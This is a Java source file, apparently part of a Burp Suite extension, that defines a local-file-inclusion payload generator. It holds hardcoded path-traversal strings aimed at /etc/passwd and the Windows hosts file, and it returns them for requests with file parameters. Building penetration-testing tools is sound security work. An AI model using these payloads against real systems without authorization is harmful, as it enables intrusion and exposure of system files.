package com.secure.ai.burp.payloads.generators;

import burp.api.montoya.http.HttpRequestToBeSent;
import com.secure.ai.burp.ml.ModelManager;
import com.secure.ai.burp.payloads.GeneratedPayload;
import com.secure.ai.burp.payloads.PayloadContext;
import java.util.*;
import java.util.concurrent.atomic.AtomicInteger;

public class LFIPayloadGenerator implements PayloadGeneratorStrategy {
    private final ModelManager modelManager;
    private final AtomicInteger generatedCount = new AtomicInteger(0);
    
    private static final String[] LFI_PAYLOADS = {
        "../../../etc/passwd", "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "/etc/passwd", "C:\\windows\\system32\\drivers\\etc\\hosts"
    };
    
    public LFIPayloadGenerator(ModelManager modelManager) { this.modelManager = modelManager; }
    
    @Override
    public List<GeneratedPayload> generatePayloads(HttpRequestToBeSent request, PayloadContext context) {
        List<GeneratedPayload> payloads = new ArrayList<>();
        for (String payload : LFI_PAYLOADS) {
            payloads.add(new GeneratedPayload.Builder(payload, "lfi", context).build());
        }
        generatedCount.addAndGet(payloads.size());
        return payloads;
    }
    
    @Override public GeneratedPayload customizePayload(String basePayload, PayloadContext context) { return new GeneratedPayload.Builder(basePayload, "lfi", context).build(); }
    @Override public String getVulnerabilityType() { return "lfi"; }
    @Override public int getGeneratedCount() { return generatedCount.get(); }
    @Override public void updateLearning(GeneratedPayload payload, boolean wasSuccessful, double actualEffectiveness) {}
    @Override public double getContextualPriority(PayloadContext context) { return 0.6; }
    @Override public boolean isApplicable(PayloadContext context) { return context.hasFileParameters(); }
}